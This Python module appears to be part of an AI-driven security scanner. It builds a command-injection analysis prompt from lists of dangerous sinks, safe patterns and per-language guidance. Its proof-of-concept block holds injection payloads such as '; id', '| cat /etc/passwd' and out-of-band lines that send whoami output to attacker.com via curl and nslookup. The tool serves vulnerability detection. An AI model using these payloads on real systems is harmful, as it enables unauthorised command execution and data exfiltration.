"""Command Injection specialized analysis prompt.

Contains command injection-specific:
- Sink patterns to look for
- Safe patterns that reject candidates
- Framework-specific considerations
- PoC patterns
"""

from typing import List, Dict, Any, Optional
from .base_analysis import BaseAnalysisPrompt


class CommandInjectionAnalyzer:
    """Command injection validation patterns."""

    dangerous_sinks = """
<cmdi_dangerous_sinks>
DANGEROUS PATTERNS (flag these):

Python:
- os.system(cmd)
- os.popen(cmd)
- subprocess.call(cmd, shell=True)
- subprocess.Popen(cmd, shell=True)
- subprocess.run(cmd, shell=True)
- subprocess.check_output(cmd, shell=True)
- commands.getstatusoutput(cmd)
- eval(code)
- exec(code)

JavaScript/Node:
- child_process.exec(cmd)
- child_process.execSync(cmd)
- child_process.spawn(cmd, {shell: true})
- eval(code)

Ruby:
- system(cmd)
- exec(cmd)
- `cmd` (backticks)
- %x{cmd}
- IO.popen(cmd)
- Open3.capture3(cmd)
- Kernel.spawn(cmd)

PHP:
- system(cmd)
- exec(cmd)
- shell_exec(cmd)
- passthru(cmd)
- popen(cmd)
- proc_open(cmd)
- backticks: `cmd`
</cmdi_dangerous_sinks>
"""

    safe_patterns = """
<cmdi_safe_patterns>
SAFE PATTERNS (reject candidates using these):

Subprocess with shell=False:
- subprocess.run(["cmd", arg1, arg2])  # List form, no shell
- subprocess.Popen(["cmd", arg1], shell=False)
- subprocess.call(["cmd", arg1])  # List form is safe

Proper escaping:
- shlex.quote(user_input)  # Python
- shlex.split() for parsing
- shellescape (Ruby)
- escapeshellarg() (PHP)
- escapeshellcmd() (PHP)

Allowlist validation:
- Command validated against allowlist before execution
- Arguments validated against strict pattern
- Input restricted to known-safe values

Node.js safe patterns:
- child_process.spawn(cmd, [args]) without shell option
- child_process.execFile(file, [args])  # Does not use shell
</cmdi_safe_patterns>
"""

    poc_patterns = """
<cmdi_poc_patterns>
PROOF OF CONCEPT PATTERNS:

Basic command chaining:
- ; id
- ; whoami
- && id
- || id

Pipe injection:
- | cat /etc/passwd
- | id
- | whoami

Command substitution:
- $(whoami)
- $(id)
- `whoami`
- `id`

Newline injection:
- %0aid
- %0awhoami

Background execution:
- & id
- ; id &

Time-based detection:
- ; sleep 5
- | sleep 5
- $(sleep 5)

Out-of-band:
- ; curl http://attacker.com/$(whoami)
- ; nslookup $(whoami).attacker.com

For PoC, use simplest payload that proves injection (e.g., ; id or $(whoami)).
</cmdi_poc_patterns>
"""

    @classmethod
    def get_framework_guidance(cls, framework: Optional[str]) -> str:
        """Return framework-specific command injection guidance."""
        if not framework:
            return ""

        guidance = {
            "python": """
<python_cmdi_guidance>
Python-specific:
- subprocess with shell=False and list args is SAFE - reject these
- os.system() is ALWAYS dangerous with user input
- subprocess.run(shell=True) is DANGEROUS
- shlex.quote() properly escapes input - check if used
- Check for f-strings or .format() in command strings
- Look for eval/exec with user-controlled strings
</python_cmdi_guidance>
""",
            "node": """
<node_cmdi_guidance>
Node.js-specific:
- child_process.exec() uses shell - DANGEROUS with user input
- child_process.execSync() uses shell - DANGEROUS
- child_process.spawn() without shell option is SAFE - reject these
- child_process.execFile() does NOT use shell - SAFE
- Check for template literals in command strings
- eval() with user input is DANGEROUS
</node_cmdi_guidance>
""",
            "ruby": """
<ruby_cmdi_guidance>
Ruby-specific:
- system() is DANGEROUS with string interpolation
- Backticks `` are ALWAYS interpreted by shell - DANGEROUS
- %x{} is shell interpreted - DANGEROUS
- exec() is DANGEROUS with user input
- Check for string interpolation: "cmd #{var}"
- Shellwords.escape() provides safe escaping
</ruby_cmdi_guidance>
""",
            "php": """
<php_cmdi_guidance>
PHP-specific:
- system(), exec(), shell_exec() are DANGEROUS
- passthru(), popen(), proc_open() are DANGEROUS
- Backticks are shell interpreted - DANGEROUS
- escapeshellarg() escapes single argument - check if used
- escapeshellcmd() escapes command - check if used
- preg_match() for allowlist validation - check if present
</php_cmdi_guidance>
""",
        }
        return guidance.get(framework.lower(), "")

    @classmethod
    def get_full_prompt(cls, framework: Optional[str] = None) -> str:
        """Return full command injection-specific prompt content."""
        parts = [
            cls.dangerous_sinks.strip(),
            cls.safe_patterns.strip(),
            cls.poc_patterns.strip(),
        ]

        fw_guidance = cls.get_framework_guidance(framework)
        if fw_guidance:
            parts.append(fw_guidance.strip())

        return "\n\n".join(parts)


def build_cmdi_prompt(
    candidates: List[Dict[str, Any]],
    framework: Optional[str] = None,
    tech_stack: Optional[Dict[str, Any]] = None,
) -> str:
    """Build complete command injection analysis prompt.

    Args:
        candidates: Command injection candidates from triage phase
        framework: Detected framework (python, node, ruby, php, etc.)
        tech_stack: Full tech stack context

    Returns:
        Complete command injection analysis prompt
    """
    parts = [
        BaseAnalysisPrompt.get_analysis_mission("command_injection"),
        BaseAnalysisPrompt.get_validation_requirements(),
        CommandInjectionAnalyzer.get_full_prompt(framework),
        BaseAnalysisPrompt.get_output_format(),
    ]

    # Add candidates
    if candidates:
        candidates_section = ["\n=== CANDIDATES TO ANALYZE ==="]
        for c in candidates:
            candidates_section.append(f"""
Candidate {c.get('id', '?')}:
  File: {c.get('file', '?')}:{c.get('line', '?')}
  Sink: {c.get('sink', '?')}
  Code: {c.get('code_snippet', 'N/A')[:200]}
""")
        parts.append("\n".join(candidates_section))

    return "\n\n".join(parts)
